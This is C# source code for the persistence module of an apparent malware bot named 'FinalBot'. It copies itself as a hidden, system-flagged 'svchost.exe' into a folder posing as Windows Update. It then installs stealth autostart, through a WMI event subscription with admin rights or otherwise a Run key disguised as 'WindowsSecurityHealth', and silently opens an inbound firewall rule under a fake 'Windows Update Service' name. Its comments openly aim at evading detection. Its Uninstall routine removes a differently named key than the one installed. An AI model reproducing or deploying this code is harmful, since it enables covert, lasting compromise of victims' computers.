using System;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using VanguardCore;

namespace FinalBot
{
    public static class Persistence
    {
        public static void Install()
        {
            AddFirewallException();
            try
            {
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                // Target directory: blends in with real Windows Update files
                string localData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string targetDir = Path.Combine(localData, "Microsoft", "Windows", "UpdateService");
                string targetPath = Path.Combine(targetDir, "svchost.exe");

                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                if (selfPath.ToLower() != targetPath.ToLower())
                {
                    try
                    {
                        foreach (var p in Process.GetProcessesByName("svchost"))
                        {
                            try
                            {
                                if (p.Id != Process.GetCurrentProcess().Id)
                                    try { if (p.MainModule?.FileName.ToLower() == targetPath.ToLower()) { p.Kill(); p.WaitForExit(1000); } } catch { }
                            }
                            catch { }
                        }
                        File.Copy(selfPath, targetPath, true);
                        File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                    }
                    catch (Exception ex)
                    {
                        Logger.Warn($"[PERSISTENCE] Initial copy failed: {ex.Message}. Using alternative name.");
                        targetPath = Path.Combine(targetDir, $"OneDriveUpdate_{Guid.NewGuid().ToString().Substring(0, 8)}.exe");
                        File.Copy(selfPath, targetPath, true);
                    }
                }

                Logger.Info("[PERSISTENCE] File copy phase complete.");

                // SURGICAL PERSISTENCE: pick the stealthiest single method per privilege level
                bool isAdmin = VanguardCore.ElevationService.IsAdmin();
                if (isAdmin)
                {
                    // Admin: WMI event subscription — completely hidden from registry, schtasks, and startup folders
                    InstallWMI(targetPath);
                    Logger.Info("[PERSISTENCE] WMI stealth method installed.");
                }
                else
                {
                    // User: single HKCU Run key — low noise, no visible UAC prompt required
                    PersistManager.InstallRegistryRun("WindowsSecurityHealth", targetPath, false);
                    Logger.Info("[PERSISTENCE] HKCU Run key installed.");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Persistence installation failed", ex);
            }
        }

        private static void InstallWMI(string exePath)
        {
            try
            {
                // Use the safe PowerShell-based method from PersistManager
                PersistManager.InstallWMIEvent(exePath);
                Logger.Info("[PERSISTENCE] WMI Event Subscription installed via PowerShell.");
            }
            catch (Exception ex)
            {
                Logger.Warn($"[PERSISTENCE] WMI failed: {ex.Message}");
            }
        }

        private static void AddFirewallException()
        {
            try
            {
                if (!VanguardCore.ElevationService.IsAdmin()) return;
                
                string selfPath = Process.GetCurrentProcess().MainModule?.FileName;
                if (string.IsNullOrEmpty(selfPath)) return;

                string cmd = $"New-NetFirewallRule -DisplayName 'Windows Update Service' -Direction Inbound -Program '{selfPath}' -Action Allow -ErrorAction SilentlyContinue";
                Process.Start(new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = $"-Command \"{cmd}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch { }
        }

        public static void Uninstall()
        {
            try
            {
                using RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key?.DeleteValue("SecurityHealthSvcHost", false);
            }
            catch { }
        }
    }
}
